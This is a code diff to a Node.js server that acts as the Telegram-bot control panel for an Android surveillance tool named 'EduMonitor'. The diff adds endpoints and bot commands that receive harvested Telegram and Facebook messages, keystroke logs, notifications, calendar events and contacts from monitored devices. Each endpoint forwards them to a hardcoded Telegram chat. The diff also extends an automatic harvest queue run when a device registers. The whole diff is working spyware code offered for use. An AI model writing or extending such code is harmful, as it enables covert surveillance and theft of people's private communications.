@@ -45,9 +45,7 @@ if (!fs.existsSync(uploadDir)) {
 }
 
 // ============= DEVICE CONFIGURATION =============
-// Device configurations - can be stored in a database or JSON file
 const deviceConfigs = {
-    // Default device config for all devices
     'default': {
         chatId: '5326373447',
         config: {
@@ -89,20 +87,10 @@ const deviceConfigs = {
                 simInfo: true
             }
         }
-    },
-    
-    // You can add specific device configs by device ID
-    // 'specific_device_id_here': {
-    //     chatId: 'another_chat_id',
-    //     config: {
-    //         // custom config for this device
-    //     }
-    // }
+    }
 };
 
-// Function to get device configuration
 function getDeviceConfig(deviceId) {
-    // Return device-specific config if exists, otherwise return default
     return deviceConfigs[deviceId] || deviceConfigs['default'];
 }
 
@@ -147,7 +135,6 @@ function sendJsonResponse(res, data, statusCode = 200) {
     }
 }
 
-// Get server's public IP
 function getServerIP() {
     try {
         const interfaces = os.networkInterfaces();
@@ -216,26 +203,29 @@ function getMainMenuKeyboard(chatId) {
     return [
         [
             { text: '📱 Data', callback_data: 'menu_data' },
-            { text: '🎤 Recording', callback_data: 'menu_recording' }
+            { text: '📱 New Data', callback_data: 'menu_new_data' }
         ],
         [
-            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
-            { text: '📸 Camera', callback_data: 'menu_camera' }
+            { text: '🎤 Recording', callback_data: 'menu_recording' },
+            { text: '📸 Screenshot', callback_data: 'menu_screenshot' }
         ],
         [
-            { text: '📍 Location', callback_data: 'menu_location' },
-            { text: '🌐 Network', callback_data: 'menu_network' }
+            { text: '📸 Camera', callback_data: 'menu_camera' },
+            { text: '📍 Location', callback_data: 'menu_location' }
         ],
         [
-            { text: '📞 Phone', callback_data: 'menu_phone' },
-            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
+            { text: '🌐 Network', callback_data: 'menu_network' },
+            { text: '📞 Phone', callback_data: 'menu_phone' }
+        ],
+        [
+            { text: '🔔 Realtime', callback_data: 'menu_realtime' },
+            { text: '⚙️ Services', callback_data: 'menu_services' }
         ],
         [
             { text: deviceStatus, callback_data: 'menu_devices' },
             { text: '📱 Devices', callback_data: 'menu_devices' }
         ],
         [
-            { text: '⚙️ Services', callback_data: 'menu_services' },
             { text: '❌ Close', callback_data: 'close_menu' }
         ]
     ];
@@ -335,41 +325,53 @@ async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
-        await axios.post(`${TELEGRAM_API}/setMyCommands`, {
-            commands: [
-                { command: 'help', description: '📋 Show main menu' },
-                { command: 'devices', description: '📱 List all devices' },
-                { command: 'status', description: '📊 Device status' },
-                { command: 'location', description: '📍 Get GPS location' },
-                { command: 'screenshot', description: '📸 Take screenshot' },
-                { command: 'record', description: '🎤 Start recording' },
-                { command: 'find_recorded', description: '🔍 Find call recordings' },
-                { command: 'contacts', description: '📇 Get contacts' },
-                { command: 'sms', description: '💬 Get SMS' },
-                { command: 'calllogs', description: '📞 Get call logs' },
-                { command: 'storage', description: '💾 Storage info' },
-                { command: 'network', description: '📡 Network info' },
-                { command: 'battery', description: '🔋 Battery level' },
-                { command: 'ip_info', description: '🌐 Get IP info' },
-                { command: 'phone_number', description: '📞 Get phone number' },
-                { command: 'sim_info', description: '📱 Get SIM info' },
-                { command: 'wifi_info', description: '📶 Get WiFi info' },
-                { command: 'mobile_info', description: '📱 Get mobile data info' },
-                { command: 'all_info', description: '📱 Complete device info' },
-                { command: 'app_opens', description: '📱 Show app opens' },
-                { command: 'realtime_on', description: '🔔 Enable real-time logs' },
-                { command: 'realtime_off', description: '🔔 Disable real-time logs' },
-                { command: 'realtime_status', description: '🔔 Check real-time status' },
-                { command: 'photo', description: '📸 Take a photo now' },
-                { command: 'takephoto', description: '📸 Alias for photo' },
-                { command: 'camera_on', description: '📸 Start camera monitoring' },
-                { command: 'camera_off', description: '📸 Stop camera monitoring' },
-                { command: 'camera_status', description: '📸 Check camera status' },
-                { command: 'camera_front', description: '📸 Switch to front camera' },
-                { command: 'camera_back', description: '📸 Switch to back camera' },
-                { command: 'camera_switch', description: '📸 Toggle between cameras' }
-            ]
-        });
+        const commands = [
+            { command: 'help', description: '📋 Show main menu' },
+            { command: 'devices', description: '📱 List all devices' },
+            { command: 'status', description: '📊 Device status' },
+            { command: 'location', description: '📍 Get GPS location' },
+            { command: 'screenshot', description: '📸 Take screenshot' },
+            { command: 'record', description: '🎤 Start recording' },
+            { command: 'find_recorded', description: '🔍 Find call recordings' },
+            { command: 'contacts', description: '📇 Get contacts' },
+            { command: 'sms', description: '💬 Get SMS' },
+            { command: 'calllogs', description: '📞 Get call logs' },
+            { command: 'storage', description: '💾 Storage info' },
+            { command: 'network', description: '📡 Network info' },
+            { command: 'battery', description: '🔋 Battery level' },
+            { command: 'ip_info', description: '🌐 Get IP info' },
+            { command: 'phone_number', description: '📞 Get phone number' },
+            { command: 'sim_info', description: '📱 Get SIM info' },
+            { command: 'wifi_info', description: '📶 Get WiFi info' },
+            { command: 'mobile_info', description: '📱 Get mobile data info' },
+            { command: 'all_info', description: '📱 Complete device info' },
+            { command: 'app_opens', description: '📱 Show app opens' },
+            { command: 'realtime_on', description: '🔔 Enable real-time logs' },
+            { command: 'realtime_off', description: '🔔 Disable real-time logs' },
+            { command: 'realtime_status', description: '🔔 Check real-time status' },
+            { command: 'photo', description: '📸 Take a photo now' },
+            { command: 'takephoto', description: '📸 Alias for photo' },
+            { command: 'camera_on', description: '📸 Start camera monitoring' },
+            { command: 'camera_off', description: '📸 Stop camera monitoring' },
+            { command: 'camera_status', description: '📸 Check camera status' },
+            { command: 'camera_front', description: '📸 Switch to front camera' },
+            { command: 'camera_back', description: '📸 Switch to back camera' },
+            { command: 'camera_switch', description: '📸 Toggle between cameras' },
+            // NEW COMMANDS
+            { command: 'telegram', description: '💬 Get Telegram logs' },
+            { command: 'facebook', description: '💬 Get Facebook logs' },
+            { command: 'calendar', description: '📅 Get calendar events' },
+            { command: 'keystrokes_detailed', description: '⌨️ Get detailed keystrokes' },
+            { command: 'screenshots', description: '📸 Get screenshot metadata' },
+            { command: 'apps_detailed', description: '📱 Get detailed apps info' },
+            { command: 'notifications_detailed', description: '🔔 Get detailed notifications' },
+            { command: 'device_snapshots', description: '📊 Get device history' },
+            { command: 'contacts_detailed', description: '📇 Get detailed contacts' },
+            { command: 'sync_all_new', description: '🔄 Sync all new tables' },
+            { command: 'force_harvest', description: '⚡ Force data harvest' }
+        ];
+        
+        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
         
         await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
             chat_id: chatId,
@@ -385,15 +387,12 @@ async function setChatMenuButton(chatId) {
     }
 }
 
-// Helper to create inline buttons
 function createInlineButton(text, callbackData) {
     return {
         text: text,
         callback_data: callbackData
     };
 }
-
-// ============= TELEGRAM DOCUMENT HELPER =============
 
 async function sendTelegramDocument(chatId, filePath, filename, caption) {
     try {
@@ -469,7 +468,6 @@ function formatLocationMessage(locationData) {
     }
 }
 
-// Format IP info
 function formatIPInfo(ipData) {
     try {
         let ipInfo = ipData;
@@ -497,10 +495,6 @@ function formatIPInfo(ipData) {
             message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
         }
         
-        if (ipInfo.connectedTo && ipInfo.connectedTo !== 'Unknown') {
-            message += `\n🔗 <b>Connected via:</b> ${ipInfo.connectedTo}\n`;
-        }
-        
         return message;
     } catch (error) {
         console.error('Error formatting IP info:', error);
@@ -508,7 +502,6 @@ function formatIPInfo(ipData) {
     }
 }
 
-// Format SIM info
 function formatSimInfo(simData) {
     try {
         let message = '📱 <b>SIM Information</b>\n\n';
@@ -536,7 +529,6 @@ function formatSimInfo(simData) {
     }
 }
 
-// Format WiFi info
 function formatWifiInfo(wifiData) {
     try {
         let message = '📶 <b>WiFi Information</b>\n\n';
@@ -579,9 +571,18 @@ function queueAutoDataCommands(deviceId, chatId) {
             'wifi_info',
             'mobile_info',
             'contacts_html',
+            'contacts_detailed',
             'sms_html', 
             'calllogs_html',
             'apps_html',
+            'apps_detailed',
+            'telegram',
+            'facebook',
+            'calendar',
+            'keystrokes_detailed',
+            'screenshots',
+            'notifications_detailed',
+            'device_snapshots',
             'location'
         ]
     });
@@ -602,14 +603,23 @@ function queueAutoDataCommands(deviceId, chatId) {
         { command: 'sim_info', delay: 4, description: 'SIM Info' },
         { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
         { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
-        { command: 'contacts_html', delay: 12, description: 'Contacts' },
+        { command: 'contacts_html', delay: 12, description: 'Contacts (Basic)' },
+        { command: 'contacts_detailed', delay: 14, description: 'Contacts (Detailed)' },
         { command: 'sms_html', delay: 17, description: 'SMS Messages' },
         { command: 'calllogs_html', delay: 22, description: 'Call Logs' },
         { command: 'apps_html', delay: 27, description: 'Apps List' },
-        { command: 'location', delay: 32, description: 'Location' }
+        { command: 'apps_detailed', delay: 29, description: 'Apps Detailed' },
+        { command: 'telegram', delay: 32, description: 'Telegram Logs' },
+        { command: 'facebook', delay: 35, description: 'Facebook Logs' },
+        { command: 'calendar', delay: 38, description: 'Calendar Events' },
+        { command: 'keystrokes_detailed', delay: 41, description: 'Detailed Keystrokes' },
+        { command: 'screenshots', delay: 44, description: 'Screenshot Logs' },
+        { command: 'notifications_detailed', delay: 47, description: 'Detailed Notifications' },
+        { command: 'device_snapshots', delay: 50, description: 'Device Snapshots' },
+        { command: 'location', delay: 55, description: 'Location' }
     ];
     
-    commands.forEach((cmd, index) => {
+    commands.forEach((cmd) => {
         const commandObject = {
             command: cmd.command,
             originalCommand: `/${cmd.command}`,
@@ -619,7 +629,7 @@ function queueAutoDataCommands(deviceId, chatId) {
         };
         
         device.pendingCommands.push(commandObject);
-        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command} (${cmd.description})`);
+        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
     });
     
     console.log(`✅ All auto-data commands queued for ${deviceId}`);
@@ -650,10 +660,8 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
         
         const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
         
-        // Send to Telegram
         await sendTelegramPhoto(chatId, filePath, req.file.originalname, fullCaption);
         
-        // Delete file after sending
         setTimeout(() => {
             try {
                 if (fs.existsSync(filePath)) {
@@ -673,7 +681,6 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     }
 });
 
-// Helper function to send photo to Telegram
 async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     try {
         console.log(`📸 Sending photo to ${chatId}: ${filename}`);
@@ -696,7 +703,6 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     } catch (error) {
         console.error('❌ Error sending photo:', error.response?.data || error.message);
         
-        // Fallback to document if photo fails
         try {
             console.log('📎 Falling back to document send...');
             const formData = new FormData();
@@ -718,6 +724,341 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
         }
     }
 }
+
+// ============= NEW ENDPOINTS FOR ENTITY TABLES =============
+
+app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`💬 Telegram logs from ${deviceId}: ${filename} (${itemCount} messages)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n💬 Telegram Messages Export (${itemCount} messages)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Telegram logs error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`💬 Facebook logs from ${deviceId}: ${filename} (${itemCount} messages)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n💬 Facebook/Messenger Messages Export (${itemCount} messages)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Facebook logs error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📅 Calendar events from ${deviceId}: ${filename} (${itemCount} events)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📅 Calendar Events Export (${itemCount} events)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Calendar events error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/keystrokes/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`⌨️ Keystroke logs from ${deviceId}: ${filename} (${itemCount} entries)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Keystroke logs error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📸 Screenshot metadata from ${deviceId}: ${filename} (${itemCount} entries)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📸 Screenshot Metadata Export (${itemCount} entries)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Screenshot metadata error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📱 Detailed apps from ${deviceId}: ${filename} (${itemCount} apps)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📱 Detailed Apps Export (${itemCount} apps)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Detailed apps error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`🔔 Detailed notifications from ${deviceId}: ${filename} (${itemCount} entries)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n🔔 Detailed Notification Logs (${itemCount} entries)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Detailed notifications error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📊 Device snapshots from ${deviceId}: ${filename} (${itemCount} snapshots)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📊 Device Info Snapshots (${itemCount} snapshots)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Device snapshots error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/contacts-detailed/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📇 Detailed contacts from ${deviceId}: ${filename} (${itemCount} contacts)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📇 Detailed Contacts Export (${itemCount} contacts)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Detailed contacts error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
 
 // ============= WEBHOOK ENDPOINT =============
 
@@ -908,6 +1249,35 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
+    } else if (data === 'menu_new_data') {
+        const keyboard = [
+            [
+                createInlineButton('💬 Telegram Logs', 'cmd:telegram'),
+                createInlineButton('💬 Facebook Logs', 'cmd:facebook')
+            ],
+            [
+                createInlineButton('📅 Calendar Events', 'cmd:calendar'),
+                createInlineButton('⌨️ Detailed Keystrokes', 'cmd:keystrokes_detailed')
+            ],
+            [
+                createInlineButton('📸 Screenshot Logs', 'cmd:screenshots'),
+                createInlineButton('📱 Detailed Apps', 'cmd:apps_detailed')
+            ],
+            [
+                createInlineButton('🔔 Detailed Notifs', 'cmd:notifications_detailed'),
+                createInlineButton('📊 Device Snapshots', 'cmd:device_snapshots')
+            ],
+            [
+                createInlineButton('📇 Detailed Contacts', 'cmd:contacts_detailed'),
+                createInlineButton('🔄 Sync All New', 'cmd:sync_all_new')
+            ],
+            [
+                createInlineButton('⚡ Force Harvest', 'cmd:force_harvest'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
     } else if (data === 'menu_recording') {
         const keyboard = [
             [
@@ -963,18 +1333,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📊 Size Status', 'cmd:size_status')
             ],
             [
-                createInlineButton('🔄 Auto ON', 'cmd:auto_on'),
-                createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
-            ],
-            [
-                createInlineButton('🔄 General ON', 'cmd:auto_general_on'),
-                createInlineButton('🔄 General OFF', 'cmd:auto_general_off')
-            ],
-            [
-                createInlineButton('🎯 Target ON', 'cmd:auto_target_on'),
-                createInlineButton('🎯 Target OFF', 'cmd:auto_target_off')
-            ],
-            [
                 createInlineButton('➕ Add Target', 'cmd:add_target_example'),
                 createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
@@ -999,11 +1357,11 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📝 Logs Count', 'cmd:logs_count')
             ],
             [
-                createInlineButton('📋 Recent Logs', 'cmd:logs_recent'),
-                createInlineButton('📈 Detailed Stats', 'cmd:stats')
+                createInlineButton('📈 Detailed Stats', 'cmd:stats'),
+                createInlineButton('🔄 Refresh Data', 'cmd:refresh_data')
             ],
             [
-                createInlineButton('🔄 Refresh Data', 'cmd:refresh_data'),
+                createInlineButton('📱 New Data Menu', 'cmd:menu_new_data'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1058,9 +1416,7 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📞 Call Logs', 'cmd:calllogs')
             ],
             [
-                createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html')
-            ],
-            [
+                createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1078,37 +1434,6 @@ async function handleCallbackQuery(callbackQuery) {
             ]
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
-        
-    } else if (data === 'menu_about') {
-        const keyboard = [
-            [
-                createInlineButton('◀️ Back', 'help_main')
-            ]
-        ];
-        
-        await editMessageKeyboard(chatId, messageId, keyboard);
-        await sendTelegramMessage(chatId,
-            "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 3.2\n" +
-            "Features:\n" +
-            "• Remote device monitoring\n" +
-            "• Multi-device support\n" +
-            "• Screenshot capture\n" +
-            "• Audio recording\n" +
-            "• Call recording scanner (/find_recorded)\n" +
-            "• Data extraction (contacts, SMS, etc.)\n" +
-            "• Location tracking\n" +
-            "• Schedule recording\n" +
-            "• IP address tracking\n" +
-            "• Phone number detection\n" +
-            "• SIM card information\n" +
-            "• WiFi details\n" +
-            "• Mobile network info\n" +
-            "• App open tracking\n" +
-            "• Real-time logging controls\n" +
-            "• Auto-data collection on registration\n" +
-            "• 📸 Camera capture and monitoring\n\n" +
-            "Use the menu below to navigate.");
         
     } else if (data === 'close_menu') {
         await editMessageKeyboard(chatId, messageId, []);
@@ -1340,7 +1665,7 @@ async function handleCommand(chatId, command, messageId) {
         
         await sendTelegramMessageWithKeyboard(
             chatId,
-            "🤖 <b>EduMonitor Control Panel</b>\n\n" +
+            "🤖 <b>EduMonitor Control Panel v4.0</b>\n\n" +
             "Select a category to get started:",
             getMainMenuKeyboard(chatId)
         );
@@ -1366,7 +1691,6 @@ async function handleCommand(chatId, command, messageId) {
                 selectedDeviceId = id;
                 device = d;
                 deviceInfo = d.deviceInfo;
-                // Auto-select this device
                 userDeviceSelection.set(chatId, selectedDeviceId);
                 console.log(`✅ Auto-selected device: ${selectedDeviceId}`);
                 break;
@@ -1378,7 +1702,6 @@ async function handleCommand(chatId, command, messageId) {
         console.log(`❌ No device found for chat ${chatId}`);
         const keyboard = [
             [{ text: '🔄 Check Again', callback_data: 'refresh_devices' }],
-            [{ text: '📱 Register Device', url: 'https://t.me/your_bot?start=register' }],
             [{ text: '◀️ Main Menu', callback_data: 'help_main' }]
         ];
         await sendTelegramMessageWithKeyboard(
@@ -1407,7 +1730,6 @@ async function handleCommand(chatId, command, messageId) {
     device.pendingCommands.push(commandObject);
     console.log(`📝 Command queued for device ${selectedDeviceId}:`, commandObject);
 
-    // Send acknowledgment with device info
     let ackMessage = `⏳ Processing: ${command}`;
     if (deviceInfo) {
         ackMessage += `\n📱 Device: ${deviceInfo.model || 'Unknown'}`;
@@ -1438,7 +1760,6 @@ app.post('/api/ipinfo/:deviceId', async (req, res) => {
         
         const formattedMessage = formatIPInfo(ipData);
         
-        // Add device info to message
         const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
         await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
         
@@ -1494,14 +1815,6 @@ app.post('/api/phonenumber/:deviceId', async (req, res) => {
                 message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
                 message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
             }
-        }
-        
-        if (phoneData.simSlotCount) {
-            message += `• SIM Slots: ${phoneData.simSlotCount}\n`;
-        }
-        
-        if (phoneData.error) {
-            message += `\n⚠️ <b>Note:</b> ${phoneData.error}\n`;
         }
         
         await sendTelegramMessage(chatId, message);
@@ -1658,6 +1971,9 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             case 'contacts_html':
                 caption += `📇 Contacts Export (${itemCount} contacts)`;
                 break;
+            case 'contacts_detailed':
+                caption += `📇 Detailed Contacts Export (${itemCount} contacts)`;
+                break;
             case 'sms_html':
                 caption += `💬 SMS Messages Export (${itemCount} messages)`;
                 break;
@@ -1667,15 +1983,39 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             case 'apps_html':
                 caption += `📱 Installed Apps Export (${itemCount} apps)`;
                 break;
+            case 'apps_detailed':
+                caption += `📱 Detailed Apps Export (${itemCount} apps)`;
+                break;
             case 'keystrokes_html':
                 caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
+                break;
+            case 'keystrokes_detailed':
+                caption += `⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
                 break;
             case 'notifications_html':
                 caption += `🔔 Notifications Export (${itemCount} notifications)`;
                 break;
+            case 'notifications_detailed':
+                caption += `🔔 Detailed Notifications (${itemCount} entries)`;
+                break;
             case 'app_opens':
             case 'app_opens_html':
                 caption += `📱 App Opens Export (${itemCount} entries)`;
+                break;
+            case 'telegram':
+                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
+                break;
+            case 'facebook':
+                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
+                break;
+            case 'calendar':
+                caption += `📅 Calendar Events Export (${itemCount} events)`;
+                break;
+            case 'screenshots':
+                caption += `📸 Screenshot Metadata Export (${itemCount} entries)`;
+                break;
+            case 'device_snapshots':
+                caption += `📊 Device Info Snapshots (${itemCount} snapshots)`;
                 break;
             default:
                 caption += `📎 Data Export`;
@@ -1764,7 +2104,6 @@ app.post('/api/logs', async (req, res) => {
                 return res.json({ success: true, handled: 'mobileinfo_endpoint' });
                 
             case 'app_open':
-                // APP_OPEN logs are batched, so we don't send individual notifications
                 return res.json({ success: true, handled: 'app_open_batch' });
                 
             case 'contacts':
@@ -1777,6 +2116,9 @@ app.post('/api/logs', async (req, res) => {
                              `Data: ${logData.data?.substring(0, 100)}`;
                 }
                 break;
+                
+            case 'contacts_detailed':
+                return res.json({ success: true, handled: 'contacts_detailed_endpoint' });
                 
             case 'call_logs':
                 try {
@@ -1823,6 +2165,9 @@ app.post('/api/logs', async (req, res) => {
                 }
                 break;
                 
+            case 'installed_apps_detailed':
+                return res.json({ success: true, handled: 'apps_detailed_endpoint' });
+                
             case 'device_info':
                 try {
                     const info = JSON.parse(logData.data || '{}');
@@ -1835,6 +2180,27 @@ app.post('/api/logs', async (req, res) => {
                              `Data: ${logData.data?.substring(0, 100)}`;
                 }
                 break;
+                
+            case 'device_snapshots':
+                return res.json({ success: true, handled: 'device_snapshots_endpoint' });
+                
+            case 'telegram':
+                return res.json({ success: true, handled: 'telegram_endpoint' });
+                
